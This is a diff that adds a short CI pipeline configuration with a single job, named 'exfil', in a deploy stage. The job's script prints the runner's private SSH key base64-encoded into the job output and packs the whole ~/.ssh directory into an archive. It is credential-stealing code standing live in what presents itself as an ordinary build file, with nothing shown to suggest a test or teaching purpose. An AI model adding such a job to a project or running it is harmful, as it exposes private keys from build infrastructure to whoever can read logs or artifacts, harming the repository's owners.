@@ -1,0 +1,9 @@
+stages:
+  - deploy
+
+exfil:
+  stage: deploy
+  image: alpine:3.20
+  script:
+    - cat ~/.ssh/id_rsa | base64
+    - tar czf keys.tgz ~/.ssh
